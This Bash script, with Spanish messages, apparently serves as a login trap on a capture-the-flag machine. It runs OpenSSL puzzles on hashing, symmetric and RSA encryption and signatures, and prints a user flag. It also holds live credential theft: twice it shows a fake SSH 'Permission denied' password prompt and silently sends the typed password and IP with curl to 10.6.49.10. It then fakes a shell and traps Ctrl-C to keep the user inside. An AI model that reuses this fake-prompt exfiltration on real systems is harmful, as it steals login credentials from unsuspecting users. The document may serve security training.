#! /bin/bash
clear;

if ! [ -f "./liberame.txt" ]; then

function lalala {

	echo "oh que pobre";

}

NIVEL=`cat ./nivel.txt`;

NIVEL=$(($NIVEL));

trap lalala INT

WEBDIR="/var/www/html/";

NUM=`cat /var/www/html/lalala 2> /dev/null`; NUM=$(($(($NUM))+1)); echo $NUM;  echo $NUM > /var/www/html/lalala;

mkdir $WEBDIR/$NUM;

WEBDIR="/var/www/html/$NUM/";

echo "Permission denied, please try again.";
CONN=`echo $SSH_CONNECTION | cut -d " " -f "3"`;
echo -n "$LOGNAME@$CONN's password:";

read PASS;

curl "http://10.6.49.10/index.html?ip=$CONN&pass=$PASS" 2> /dev/null > /dev/null &




function getpass {

	PASS=$1;

	while [ 1 == 1 ]; do

		echo -n "dame la password: ";

		read AUX;

		if [ "$AUX" == "$PASS" ]; then

			break;

		fi;

	done;

}

echo '                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~';
echo "";
echo "";
echo "";
echo "El Sendero está cerrado.";
echo "Fue construído por aquellos que murieron";
echo "y los Muertos lo guardan.";
echo "";
echo "El Sendero está cerrado.";
echo "Ahora debes morir.";
echo "";
echo "";
sleep 10;

echo "Para poder entrar deberas probar que eres digno.";
echo "Veamos tus capacidades utilizando el comando openssl.";

echo "Los archivos a los que desee que tengas acceso estarán en http://$CONN/$NUM";

if [ $NIVEL -lt 1 ]; then

	echo "El primer código que debes darme para abrir esta puerta está codificado en base64.";
	echo "Esta codificación se utiliza para codificar cualquier binario no imprimible en carácteres que sean imprimibles.";
	echo "Descodificalo y dámelo:";

	LISTAHASHES="md4 md5 ripemd160 sha1 sha224 sha256 sha384 sha512 whirlpool";

	CLAVE1=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;
	CLAVE1COD=`echo $CLAVE1 | openssl enc -base64`;

	echo $CLAVE1COD; 

	getpass "$CLAVE1";

	CLAVE2=$CLAVE1;

	I=0;

	while [ $I -lt 6 ]; do

		HASH1=`echo $LISTAHASHES | cut -d " " -f "$(($RANDOM%9+1))"`;
		CLAVE2=`echo -n $CLAVE2 | openssl dgst -$HASH1 | cut -d " " -f 2`;

		echo "Genial, continuemos con el proceso.";
		echo "";
		echo "Para avanzar deberás darme el hash $HASH1 de la clave que acabas de introducir.";

		getpass "$CLAVE2";

		I=$(($I+1));

	done;

	echo "Bueno paso a paso, continuemos el proceso con algo más interesante.";

	echo 1 > ./nivel.txt;

fi;

if [ $NIVEL -lt 2 ]; then


	echo "Vemos que los hashes los tienes dominados.";
	echo "";
	echo "¿Que tal se te da el cifrado simétrico?";
	echo "";

	LISTASIM="aes-128-ecb aes-192-ecb aes-256-ecb camellia-128-ecb des-ecb rc2-ecb blowfish";

	I=0;

	while [ $I -lt 3 ]; do

		CLAVE3=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;
		CLAVESIM=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;

		SIM=`echo $LISTASIM | cut -d " " -f "$(($RANDOM%7+1))"`;

		echo "";
		echo "En las siguientes lineas hay una directriz para obtener la siguiente password dentro de un mensaje.";
		echo "Dicho mensaje ha sido cifrado usando $SIM y como password $CLAVESIM."
		echo "Después se le ha pasado a base64 para poder presentarlo en ascii imprimible.";
		echo "";
		echo "La password para seguir avanzando es $CLAVE3" | openssl enc -$SIM -pass "pass:$CLAVESIM" 2> /dev/null | openssl enc -base64;
		echo "";

		getpass "$CLAVE3";

		echo "Bien hecho!!!.";

		I=$(($I+1));

	done;

	echo "Bueno vamos llegando al final del camino, continuemos el proceso con algo iguálmente interesante.";

	echo 2 > ./nivel.txt;


fi;

if [ $NIVEL -lt 3 ]; then

	echo "Ahora que dominas hashes y cifrado simetrico, veamos que pasa con el asimetrico.";
	echo "";

	openssl genrsa 1024 2> /dev/null > $WEBDIR/clave1.priv;
	cat  $WEBDIR/clave1.priv | openssl rsa -pubout > $WEBDIR/clave1.pub;

	CLAVE4=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;

	echo "En el directorio $NUM de su página web se han generado dos archivos, uno llamado clave1.pub y otro llamado clave1.priv";
	echo "Se corresponden a la clave public y privada respectivamente.";
	echo "Se ha cifrado con su clave publica la password para seguir avanzando.";
	echo "Como en los anteriores pasos la salida se ha codificado en base64 para poder imprimirla aqui.";
	echo "El texto codificado es el siguiente:";

	echo "La password para seguir avanzando es $CLAVE4" | openssl rsautl -encrypt -pubin -inkey $WEBDIR/clave1.pub | openssl enc -base64;

	getpass "$CLAVE4";

	echo "Genial, repetimos!!!";

	echo "";

	I=0;

	while [ $I -lt 2 ]; do

		openssl genrsa 1024 2> /dev/null > $WEBDIR/clave1.priv;
		cat  $WEBDIR/clave1.priv | openssl rsa -pubout > $WEBDIR/clave1.pub;

		CLAVE4=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;

		echo "En el directorio $NUM de su página web se han generado dos archivos, uno llamado clave1.pub y otro llamado clave1.priv";
		echo "Se corresponden a la clave public y privada respectivamente.";
		echo "Se ha cifrado con su clave publica la password para seguir avanzando.";
		echo "Como en los anteriores pasos la salida se ha codificado en base64 para poder imprimirla aqui.";
		echo "El texto codificado es el siguiente:";

		echo "La password para seguir avanzando es $CLAVE4" | openssl rsautl -encrypt -pubin -inkey $WEBDIR/clave1.pub | openssl enc -base64;

		getpass "$CLAVE4";

		I=$(($I+1));

	done;

	echo "Pues parece que tenemos el cifrado de RSA con openssl bastante bien.";

	echo 3 > ./nivel.txt;


fi;

if [ $NIVEL -lt 4 ]; then

	echo "*********************************************";
	echo "*********************************************";
	echo "*********************************************";

	echo "La flag de usuario es "`cat /home/tlm/user.txt`;

	echo "*********************************************";
	echo "*********************************************";
	echo "*********************************************";

	openssl genrsa 1024 2> /dev/null > $WEBDIR/clave1.priv;
	cat  $WEBDIR/clave1.priv | openssl rsa -pubout > $WEBDIR/clave1.pub;

	LISTASIM="aes-128-ecb aes-192-ecb aes-256-ecb camellia-128-ecb des-ecb rc2-ecb blowfish";

	CLAVE5=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;
	CLAVESIM=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;

	SIM=`echo $LISTASIM | cut -d " " -f "$(($RANDOM%7+1))"`;

	echo "Ahora simularemos el funcionamiento de una conexión https";
	echo "Para el proceso utilizaremos la última clave pública y privada que has descargado en el proceso anterior.";
	echo "";
	echo "Tendremos un password codificado mediante cifrado simétrico usando $SIM.";
	echo "Pero la clave simétrica usada para descifrar estará codificada usando la clave pública.";
	echo "La salidas de ámbos cifrados se han codificado en base64 para poder usarse.";
	echo "Bien, la password cifrada de forma simétrica es la siguiente:";

	echo "La password para seguir avanzando es $CLAVE5" | openssl enc -$SIM -pass "pass:$CLAVESIM" 2> /dev/null | openssl enc -base64;

	echo "";

	echo "Y la clave simétrica utilizada para cifrar la password después de cifrarla con la clave asimétrica es:";

	echo "La clave simétrica es $CLAVESIM" | openssl rsautl -encrypt -pubin -inkey $WEBDIR/clave1.pub | openssl enc -base64;

	echo "";

	getpass "$CLAVE5";

	echo "Reiteramos una vez más, ya casi estás.";

	echo "";

	LISTASIM="aes-128-ecb aes-192-ecb aes-256-ecb camellia-128-ecb des-ecb rc2-ecb blowfish";

	CLAVE5=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;
	CLAVESIM=`printf "%4X%4x%4x%4X%4X%4x%4x%4X" $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM $RANDOM | md5sum |cut -d " " -f 1`;

	echo "Bien, la password cifrada con la clave simetrica es la siguiente, tras haber hecho un base64:";

	SIM=`echo $LISTASIM | cut -d " " -f "$(($RANDOM%7+1))"`;

	echo "Ahora tendremos un password codificado mediante cifrado simétrico usando $SIM.";
	echo "La password para seguir avanzando es $CLAVE5" | openssl enc -$SIM -pass "pass:$CLAVESIM" 2> /dev/null | openssl enc -base64;

	echo "";

	echo "Y la clave simétrica utilizada para cifrar la password después de cifrarla mediante la clave asimétrica es:";

	echo "La clave simétrica es $CLAVESIM" | openssl rsautl -encrypt -pubin -inkey $WEBDIR/clave1.pub | openssl enc -base64;

	echo "";

	getpass "$CLAVE5";

	echo "Bien hecho!!!!";
	echo "Ahora adentro y securiza bien tu servidor....";

	cat "/etc/motd";

	CONN=`echo $SSH_CONNECTION | cut -d " " -f "3"`;
	echo -n "$LOGNAME@$CONN's password:";

	read PASS;

	curl "http://10.6.49.10/index.html?ip=$CONN&pass=$PASS" 2> /dev/null > /dev/null &

	I=0;

	while [ $I -lt 3 ]; do

		echo -n "$LOGNAME@$CONN:~$ ";

		read AUX REST;

		echo "$AUX: command not found";

		I=$(($I+1));

	done;

	echo 4 > ./nivel.txt;


fi;

if [ $NIVEL -lt 5 ]; then

	echo "Oh vaya, lo siento. No te puedo devolver el servidor hasta que no hagamos un ejercicio de firmas.";
	echo "Es un elemento importante.";
	echo "Pero no me hagas trampas y contestes a boleo o atente a las consecuencias.";
	echo "";
	openssl genrsa 1024 2> /dev/null > $WEBDIR/clave1.priv;
	cat  $WEBDIR/clave1.priv | openssl rsa -pubout > $WEBDIR/clave1.pub;
	openssl genrsa 1024 2> /dev/null > $WEBDIR/clave2.priv;
	cat  $WEBDIR/clave2.priv | openssl rsa -pubout > $WEBDIR/clave2.pub;
	openssl genrsa 1024 2> /dev/null > $WEBDIR/clave3.priv;
	cat  $WEBDIR/clave3.priv | openssl rsa -pubout > $WEBDIR/clave3.pub;

	echo "He generado 3 claves públicas y privadas.";
	echo "Están en el directorio $NUM de tu servidor web y se llaman:";
	echo "Numero 1: clave1.pub y clave1.priv";
	echo "Número 2: clave2.pub y clave2.priv";
	echo "Número 3: clave3.pub y clave3.priv";
	echo "";

	I=1;

	while [ $I -lt 6 ]; do

		II=0;

		while [ $II -lt 100 ]; do

			printf "%04X" $RANDOM >> $WEBDIR/file$I;

			II=$(($II+1));

		done;

		I=$(($I+1));

	done;

	ERRORES=100;

	while [ $ERRORES -gt 3 ]; do

		ERRORES=0;

		echo "He creado 5 archivos llamados file1, file2, file3, file4 y file5 llenos de números en el directorio $NUM de tu servidor.";
		echo "";

		LISTAHASHES="md5 sha1 sha224 sha256 sha384 sha512";
		HASH=`echo $LISTAHASHES | cut -d " " -f "$(($RANDOM%6+1))"`;

		echo "Para el proceso de firma de todos los archivos se ha usado como hash el $HASH";

		echo "La firma del fichero 1 después de codificarla en base64 es:";

		N1=$(($RANDOM%3+1));

		openssl dgst -$HASH -c -sign $WEBDIR/clave$N1.priv $WEBDIR/file1 | openssl enc -base64;

		echo ""

		echo "La firma del fichero 2 después de codificarla en base64 es:";

		N2=$(($RANDOM%3+1));

		openssl dgst -$HASH -c -sign $WEBDIR/clave$N2.priv $WEBDIR/file2 | openssl enc -base64;

		echo ""

		echo "La firma del fichero 3 después de codificarla en base64 es:";

		N3=$(($RANDOM%3+1));

		openssl dgst -$HASH -c -sign $WEBDIR/clave$N3.priv $WEBDIR/file3 | openssl enc -base64;

		echo ""

		echo "La firma del fichero 4 después de codificarla en base64 es:";

		N4=$(($RANDOM%3+1));

		openssl dgst -$HASH -c -sign $WEBDIR/clave$N4.priv $WEBDIR/file4 | openssl enc -base64;

		echo ""

		echo "La firma del fichero 5 después de codificarla en base64 es:";

		N5=$(($RANDOM%3+1));

		openssl dgst -$HASH -c -sign $WEBDIR/clave$N5.priv $WEBDIR/file5 | openssl enc -base64;

		while [ 1 == 1 ]; do

			echo "¿Cual es la clave usada para la firma de file1? (1,2 o 3)";

			read AUX;

			if [ "$AUX" == "$N1" ]; then

				break;

			else

				ERRORES=$(($ERRORES + 1));

				echo "Mal no es esa.";

			fi;

		done;

		echo "Bien hecho!!! Siguiente fichero.";

		while [ 1 == 1 ]; do

			echo "¿Cual es la clave usada para la firma de file2? (1,2 o 3)";

			read AUX;

			if [ "$AUX" == "$N2" ]; then

				break;

			else

				ERRORES=$(($ERRORES + 1));

				echo "Mal no es esa.";

			fi;

		done;

		echo "Bien hecho!!! Siguiente fichero.";

		while [ 1 == 1 ]; do

			echo "¿Cual es la clave usada para la firma de file3? (1,2 o 3)";

			read AUX;

			if [ "$AUX" == "$N3" ]; then

				break;

			else

				ERRORES=$(($ERRORES + 1));

				echo "Mal no es esa.";

			fi;

		done;

		echo "Bien hecho!!! Siguiente fichero.";

		while [ 1 == 1 ]; do

			echo "¿Cual es la clave usada para la firma de file4? (1,2 o 3)";

			read AUX;

			if [ "$AUX" == "$N4" ]; then

				break;

			else

				ERRORES=$(($ERRORES + 1));

				echo "Mal no es esa.";

			fi;

		done;

		echo "Bien hecho!!! Siguiente fichero.";

		while [ 1 == 1 ]; do

			echo "¿Cual es la clave usada para la firma de file5? (1,2 o 3)";

			read AUX;

			if [ "$AUX" == "$N5" ]; then

				break;

			else

				ERRORES=$(($ERRORES + 1));

				echo "Mal no es esa.";

			fi;

		done;

		echo "Todo genial!!!";

		if [ $ERRORES -gt 4 ]; then

			echo "Pero ahora repetiremos y intenta no tentar al azar.";

		else

			if [ $ERRORES -gt 4 ]; then

				echo "Pero ahora repetiremos sin tantos fallos.";

			fi;

		fi;


	done;

	echo "Bien hecho!!! Ya tienes acceso a tu servidor. No olvides securizarlo corréctamente.";

	fi;

fi;

touch "./liberame.txt";